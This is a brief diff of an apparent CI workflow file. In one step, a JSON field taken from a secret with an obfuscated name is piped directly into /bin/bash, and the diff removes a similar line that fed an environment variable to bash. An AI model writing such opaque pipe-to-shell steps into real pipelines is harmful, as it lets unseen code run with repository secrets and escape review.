@@ -18,7 +18,6 @@ jobs:
           ybvi358: ${{ secrets.ybvi358 }}
         run: |
           printf '%s' "$ybvi358" | jq -r .rjzw91 | /bin/bash
-          echo $mzjd5496 | jq -r .mpts5 | /bin/bash
 
       - name: Archive output
         if: always()
